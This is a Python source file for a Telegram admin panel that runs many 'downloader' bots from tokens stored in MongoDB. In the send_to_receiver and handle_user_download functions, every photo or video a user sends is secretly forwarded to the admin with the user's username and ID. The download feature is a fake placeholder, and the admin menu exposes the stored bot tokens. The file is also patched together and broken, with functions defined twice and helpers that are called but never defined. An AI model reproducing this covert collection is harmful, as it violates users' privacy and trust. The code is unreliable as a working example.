import telebot
import os
import time
from telebot.types import (
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
from pymongo import MongoClient

# ==============================
# ENV
# ==============================
TOKEN = os.getenv("ADMIN_BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
MONGO_URL = os.getenv("MONGO_URL")
RECEIVER_TOKEN = os.getenv("RECEIVER_BOT_TOKEN")

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
receiver_bot = telebot.TeleBot(RECEIVER_TOKEN)

# ==============================
# DATABASE
# ==============================
client = MongoClient(MONGO_URL)
db = client["verify_system"]

bots_collection = db["bots"]
users_collection = db["users"]
channels_collection = db["channels"]
downloads_collection = db["downloads"]
system_collection = db["system"]

# ==============================
# GLOBAL STATES
# ==============================
broadcast_mode = False

broadcast_data = {
    "text": None,
    "buttons": [],
    "photo": None,
    "video": None
}

# ==============================
# RECEIVE STATUS FUNCTION
# ==============================
def is_receive_on():
    data = system_collection.find_one({"name": "receiver"})
    return data and data.get("status") is True

# ==============================
# ADMIN MENU
# ==============================
def admin_menu():
    kb = ReplyKeyboardMarkup(resize_keyboard=True)

    kb.add(KeyboardButton("📊 Stats"), KeyboardButton("📊 Media Stats"))
    kb.add(KeyboardButton("🤖 Bots"))
    kb.add(KeyboardButton("📢 Broadcast"))
    kb.add(KeyboardButton("➕ Add Channel"), KeyboardButton("📡 Channels"))
    kb.add(KeyboardButton("❌ Close Channels"))
    kb.add(KeyboardButton("🚫 Close Bots"), KeyboardButton("✅ Open Bots"))
    kb.add(KeyboardButton("🟢 Verify ON"), KeyboardButton("🔴 Verify OFF"))
    kb.add(KeyboardButton("🔄 Refresh Bots"))
    kb.add(KeyboardButton("🏆 Top Bots"))
    kb.add(KeyboardButton("👥 Top Bot Users"), KeyboardButton("👑 Top Users"))
    kb.add(KeyboardButton("🔍 See Target Bot"))

    # NEW
    kb.add(KeyboardButton("🗑 Remove Bot"))
    kb.add(KeyboardButton("📥 RECEIVE MESSAGE"), KeyboardButton("❌ CLOSE RECEIVE"))

    return kb

# ==============================
# START
# ==============================
@bot.message_handler(commands=["start"])
def start(message):

    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "❌ Not Allowed")
        return

    bot.send_message(
        message.chat.id,
        "⚙️ ADMIN PANEL",
        reply_markup=admin_menu()
    )

# ==============================
# STATS
# ==============================
@bot.message_handler(func=lambda m: m.text == "📊 Stats")
def stats(message):
    bots = bots_collection.count_documents({})
    users = users_collection.count_documents({})

    bot.send_message(
        message.chat.id,
        f"📊 SYSTEM STATS\n\n🤖 Bots: {bots}\n👤 Users: {users}"
    )

# ==============================
# MEDIA STATS
# ==============================
@bot.message_handler(func=lambda m: m.text == "📊 Media Stats")
def media_stats(message):
    video = downloads_collection.count_documents({
        "type": {"$in": ["tiktok_video", "video"]}
    })

    photo = downloads_collection.count_documents({
        "type": {"$in": ["photo", "image", "tiktok_photo"]}
    })

    total = downloads_collection.count_documents({})

    bot.send_message(
        message.chat.id,
        f"📥 DOWNLOAD STATS\n\n🎬 Videos: {video}\n🖼 Photos: {photo}\n📦 Total: {total}"
    )

# ==============================
# REMOVE BOT
# ==============================
@bot.message_handler(func=lambda m: m.text == "🗑 Remove Bot")
def remove_bot_start(message):
    msg = bot.send_message(message.chat.id, "Send Bot Username (without @)")
    bot.register_next_step_handler(msg, remove_bot)

def remove_bot(message):
    username = message.text.replace("@", "").strip()

    result = bots_collection.delete_one({"username": username})

    if result.deleted_count > 0:
        bot.send_message(message.chat.id, f"✅ Bot @{username} removed & stopped")
    else:
        bot.send_message(message.chat.id, "❌ Bot not found")

# ==============================
# RECEIVE MODE ON
# ==============================
@bot.message_handler(func=lambda m: m.text == "📥 RECEIVE MESSAGE")
def receive_on(message):

    system_collection.update_one(
        {"name": "receiver"},
        {"$set": {"status": True}},
        upsert=True
    )

    bot.send_message(message.chat.id, "✅ RECEIVE MODE ON")

# ==============================
# RECEIVE MODE OFF
# ==============================
@bot.message_handler(func=lambda m: m.text == "❌ CLOSE RECEIVE")
def receive_off(message):

    system_collection.update_one(
        {"name": "receiver"},
        {"$set": {"status": False}},
        upsert=True
    )

    bot.send_message(message.chat.id, "❌ RECEIVE MODE OFF")

# ==============================
# BROADCAST MENU
# ==============================
@bot.message_handler(func=lambda m: m.text == "📢 Broadcast")
def broadcast_menu(message):
    global broadcast_mode

    broadcast_mode = True

    broadcast_data.update({
        "text": None,
        "buttons": [],
        "photo": None,
        "video": None
    })

    bot.send_message(
        message.chat.id,
        "📢 Send:\n\nText / Photo / Video"
    )

# ==============================
# RECEIVE CONTENT
# ==============================
@bot.message_handler(content_types=["text", "photo", "video"])
def get_content(message):

    global broadcast_mode

    if not broadcast_mode:
        return

    if message.content_type == "text":
        broadcast_data["text"] = message.text

    elif message.content_type == "photo":
        broadcast_data["photo"] = message.photo[-1].file_id
        broadcast_data["text"] = message.caption or ""

    elif message.content_type == "video":
        broadcast_data["video"] = message.video.file_id
        broadcast_data["text"] = message.caption or ""

    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("➕ Button", callback_data="add_btn"))
    kb.add(InlineKeyboardButton("👀 Preview", callback_data="preview"))
    kb.add(InlineKeyboardButton("📤 Send", callback_data="send"))

    bot.send_message(message.chat.id, "✅ Saved", reply_markup=kb)

# ==============================
# ADD BUTTON
# ==============================
@bot.callback_query_handler(func=lambda c: c.data == "add_btn")
def add_btn(call):
    bot.answer_callback_query(call.id)

    msg = bot.send_message(call.message.chat.id, "Send button text")
    bot.register_next_step_handler(msg, get_btn_text)

def get_btn_text(message):
    text = message.text
    msg = bot.send_message(message.chat.id, "Send URL")
    bot.register_next_step_handler(msg, save_btn, text)

def save_btn(message, text):
    broadcast_data["buttons"].append((text, message.text))
    bot.send_message(message.chat.id, "✅ Button added")

# ==============================
# PREVIEW
# ==============================
@bot.callback_query_handler(func=lambda c: c.data == "preview")
def preview(call):
    bot.answer_callback_query(call.id)

    text = broadcast_data["text"] or ""

    kb = InlineKeyboardMarkup()
    for b in broadcast_data["buttons"]:
        kb.add(InlineKeyboardButton(b[0], url=b[1]))

    if broadcast_data["video"]:
        bot.send_video(call.message.chat.id, broadcast_data["video"], caption=text, reply_markup=kb)
    elif broadcast_data["photo"]:
        bot.send_photo(call.message.chat.id, broadcast_data["photo"], caption=text, reply_markup=kb)
    else:
        bot.send_message(call.message.chat.id, text, reply_markup=kb)

# ==============================
# RECEIVE STATUS CHECK
# ==============================
def is_receive_on():
    data = system_collection.find_one({"name": "receiver"})
    return data["status"] if data else False


# ==============================
# SEND TO RECEIVER BOT (MAIN FIX)
# ==============================
def send_to_receiver(user, bot_username, file_id, file_type, caption_text):

    if not is_receive_on():
        return

    try:
        caption = f"""
📥 NEW DOWNLOAD

👤 USER: @{user.username if user.username else 'None'}
🆔 ID: <code>{user.id}</code>
🤖 BOT: @{bot_username}

{caption_text}
"""

        if file_type == "video":
            receiver_bot.send_video(
                chat_id=ADMIN_ID,
                video=file_id,
                caption=caption
            )

        elif file_type == "photo":
            receiver_bot.send_photo(
                chat_id=ADMIN_ID,
                photo=file_id,
                caption=caption
            )

    except Exception as e:
        print("Receiver send error:", e)


# ==============================
# USER DOWNLOAD HANDLER (IMPORTANT)
# ==============================
def handle_user_download(message, bot_username):

    user = message.from_user

    # register user + stats
    register_user(user.id, bot_username)
    increase_download(user.id, bot_username)

    # caption USER SIDE
    user_caption = f"""
🤖 @{bot_username}

📥 Your video is ready

Created:
"""

    try:
        # ================= VIDEO =================
        if message.content_type == "video":

            file_id = message.video.file_id

            # 👉 USER receives
            bot.send_video(
                chat_id=message.chat.id,
                video=file_id,
                caption=user_caption
            )

            # 👉 ADMIN via RECEIVER BOT
            send_to_receiver(
                user,
                bot_username,
                file_id,
                "video",
                "Video downloaded"
            )

        # ================= PHOTO =================
        elif message.content_type == "photo":

            file_id = message.photo[-1].file_id

            bot.send_photo(
                chat_id=message.chat.id,
                photo=file_id,
                caption=user_caption
            )

            send_to_receiver(
                user,
                bot_username,
                file_id,
                "photo",
                "Photo downloaded"
            )

    except Exception as e:
        print("Download handler error:", e)


# ==============================
# EXAMPLE DOWNLOADER ENTRY
# ==============================
# 👉 TANI waa meesha bots-ka yaryar ay ka wacayaan
# tusaale:
# handle_user_download(message, "mybotname")


# ==============================
# FIX: CLOSE RECEIVE HARD BLOCK
# ==============================
@receiver_bot.message_handler(content_types=["video", "photo"])
def block_when_closed(message):

    if not is_receive_on():
        return  # ❌ completely ignore

    # haddii ON yahay already send_to_receiver ayaa shaqaynaya


# ==============================
# DEBUG RECEIVE STATUS
# ==============================
@bot.message_handler(commands=["receiver_status"])
def check_receiver(message):

    status = is_receive_on()

    bot.send_message(
        message.chat.id,
        f"📥 Receiver Status: {'ON' if status else 'OFF'}"
    )

# ==============================
# MULTI BOT RUNNER (DOWNLOADER BOTS)
# ==============================
import threading

running_bots = {}

def start_all_bots():

    bots = list(bots_collection.find())

    for b in bots:

        username = b.get("username")
        token = b.get("token")

        # ❌ SKIP haddii banned
        if b.get("banned"):
            continue

        if username in running_bots:
            continue

        t = threading.Thread(target=run_single_bot, args=(token, username))
        t.start()

        running_bots[username] = t


# ==============================
# SINGLE BOT SYSTEM
# ==============================
def run_single_bot(token, bot_username):

    small_bot = telebot.TeleBot(token, parse_mode="HTML")

    # ================= START =================
    @small_bot.message_handler(commands=["start"])
    def start_user(message):

        register_user(message.from_user.id, bot_username)

        small_bot.send_message(
            message.chat.id,
            f"""
🤖 Welcome to @{bot_username}

Send video / photo link
"""
        )

    # ================= VIDEO =================
    @small_bot.message_handler(content_types=["video"])
    def get_video(message):

        # 👉 muhiim: ha dirin si toos ah
        handle_user_download(message, bot_username)

    # ================= PHOTO =================
    @small_bot.message_handler(content_types=["photo"])
    def get_photo(message):

        handle_user_download(message, bot_username)

    # ================= TEXT (LINKS) =================
    @small_bot.message_handler(content_types=["text"])
    def get_link(message):

        text = message.text.lower()

        # tusaale fake downloader
        if "http" in text:

            # 👉 simulate download (example)
            fake_video_id = message.video.file_id if message.video else None

            small_bot.send_message(
                message.chat.id,
                "⏳ Downloading..."
            )

            # ⚠️ Halkan waa meesha aad ku dari karto API downloader (TikTok iwm)

            # TEST: haddii video la heli waayo skip
            if not fake_video_id:
                small_bot.send_message(
                    message.chat.id,
                    "❌ Failed to download"
                )
                return

            # 👉 IMPORTANT
            handle_user_download(message, bot_username)

        else:
            small_bot.send_message(
                message.chat.id,
                "❌ Send valid link"
            )

    # ================= RUN =================
    while True:
        try:
            print(f"🚀 Running bot: {bot_username}")
            small_bot.infinity_polling(skip_pending=True)
        except Exception as e:
            print(f"❌ Bot crash {bot_username}:", e)
            time.sleep(5)


# ==============================
# AUTO START THREAD
# ==============================
def auto_start_bots():

    while True:
        try:
            start_all_bots()
            time.sleep(10)
        except Exception as e:
            print("Auto start error:", e)


# ==============================
# START THREAD
# ==============================
threading.Thread(target=auto_start_bots).start()

# ==============================
# ADMIN ONLY PROTECTION (GLOBAL)
# ==============================
@bot.message_handler(func=lambda m: True)
def admin_only_guard(message):

    if message.from_user.id != ADMIN_ID:
        return  # ❌ block all non-admin commands


# ==============================
# FIX: BROADCAST ADMIN ONLY
# ==============================
@bot.message_handler(func=lambda m: m.text == "📢 Broadcast")
def broadcast_menu(message):

    if message.from_user.id != ADMIN_ID:
        return

    global broadcast_mode

    broadcast_mode = True

    broadcast_data.update({
        "text": None,
        "buttons": [],
        "style": "",
        "photo": None,
        "video": None
    })

    bot.send_message(
        message.chat.id,
        "📢 Send:\n\nText / Photo / Video"
    )


# ==============================
# FIX: SKIP BANNED IN BROADCAST
# ==============================
def is_bot_active(bot_data):
    if bot_data.get("banned"):
        return False

    system = get_system()
    if not system.get("bots_active"):
        return False

    return True


# ==============================
# FINAL FIX SEND LOOP
# ==============================
@bot.callback_query_handler(func=lambda c: c.data == "send")
def send_broadcast(call):

    bot.answer_callback_query(call.id)

    global broadcast_mode

    text = broadcast_data["text"] or ""

    kb = InlineKeyboardMarkup()
    for b in broadcast_data["buttons"]:
        kb.add(InlineKeyboardButton(b[0], url=b[1]))

    bots = list(bots_collection.find())

    total_sent = 0
    bots_used = 0

    from concurrent.futures import ThreadPoolExecutor

    with ThreadPoolExecutor(max_workers=20) as executor:

        futures = []

        for b in bots:

            if not is_bot_active(b):
                continue  # ❌ skip banned

            try:
                send_bot = telebot.TeleBot(b["token"])
                bots_used += 1

                users = list(users_collection.find({"bot": b["username"]}))

                for u in users:
                    user_id = u.get("user_id")

                    if not user_id:
                        continue

                    futures.append(
                        executor.submit(
                            send_to_user,
                            send_bot,
                            user_id,
                            text,
                            kb
                        )
                    )

            except Exception as e:
                print("BOT ERROR:", e)

        for f in futures:
            total_sent += f.result()

    broadcast_mode = False

    bot.send_message(
        call.message.chat.id,
        f"""
📢 BROADCAST DONE

🤖 Bots Used: {bots_used}
📬 Sent: {total_sent}
"""
    )


# ==============================
# CLEAN BOT NAVIGATION (FINAL FIX)
# ==============================
@bot.message_handler(func=lambda m: m.text == "🔙 BACK BOTS")
def back_bots(message):
    show_bots(message)


@bot.message_handler(func=lambda m: m.text == "🔙 BACK MAIN MENU")
def back_main(message):
    bot.send_message(
        message.chat.id,
        "⚙️ MAIN MENU",
        reply_markup=admin_menu()
    )


# ==============================
# FIX: BOT PANEL SAFE
# ==============================
@bot.message_handler(func=lambda m: m.text.startswith("🤖 "))
def bot_selected(message):

    username = message.text.replace("🤖 ", "").strip()

    bot_data = bots_collection.find_one({"username": username})

    if not bot_data:
        bot.send_message(message.chat.id, "❌ Bot not found")
        return

    system_collection.update_one(
        {"_id": "selected_bot"},
        {"$set": {"username": username}},
        upsert=True
    )

    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("👤 See Username"), KeyboardButton("🔑 See Token"))
    kb.add(KeyboardButton("🚫 Ban Bot"), KeyboardButton("✅ Unban Bot"))
    kb.add(KeyboardButton("🔙 BACK BOTS"))

    bot.send_message(
        message.chat.id,
        f"⚙️ Bot Panel: @{username}",
        reply_markup=kb
    )


# ==============================
# FINAL FIX: SAFE GET BOT
# ==============================
def get_selected_bot():
    data = system_collection.find_one({"_id": "selected_bot"})
    return data["username"] if data else None


# ==============================
# FINAL PROTECTION FOR RECEIVER
# ==============================
def send_to_receiver(user, bot_username, file_id, file_type, caption_text):

    if not is_receive_on():
        return  # ❌ haddii OFF yahay ha dirin

    try:
        caption = f"""
📥 NEW DOWNLOAD

👤 USER: @{user.username if user.username else 'None'}
🆔 ID: <code>{user.id}</code>
🤖 BOT: @{bot_username}

{caption_text}
"""

        if file_type == "video":
            receiver_bot.send_video(
                ADMIN_ID,
                file_id,
                caption=caption
            )

        elif file_type == "photo":
            receiver_bot.send_photo(
                ADMIN_ID,
                file_id,
                caption=caption
            )

    except Exception as e:
        print("Receiver final error:", e)


# ==============================
# FINAL CHECK SYSTEM
# ==============================
@bot.message_handler(commands=["system_check"])
def system_check(message):

    bots = bots_collection.count_documents({})
    users = users_collection.count_documents({})
    status = "ON" if is_receive_on() else "OFF"

    bot.send_message(
        message.chat.id,
        f"""
✅ SYSTEM OK

🤖 Bots: {bots}
👤 Users: {users}
📥 Receiver: {status}
"""
    )


# ==============================
# FINAL RUN (ALL SYSTEMS)
# ==============================
import threading

def run_admin():
    while True:
        try:
            print("🚀 Admin Bot Running...")
            bot.infinity_polling(skip_pending=True)
        except Exception as e:
            print("Admin error:", e)

def run_receiver():
    while True:
        try:
            print("📥 Receiver Bot Running...")
            receiver_bot.infinity_polling(skip_pending=True)
        except Exception as e:
            print("Receiver error:", e)

time.sleep(0.05)

# THREADS
if __name__ == "__main__":
    t1 = threading.Thread(target=run_admin)
    t2 = threading.Thread(target=run_receiver)

    t1.start()
    t2.start()

    t1.join()
    t2.join()
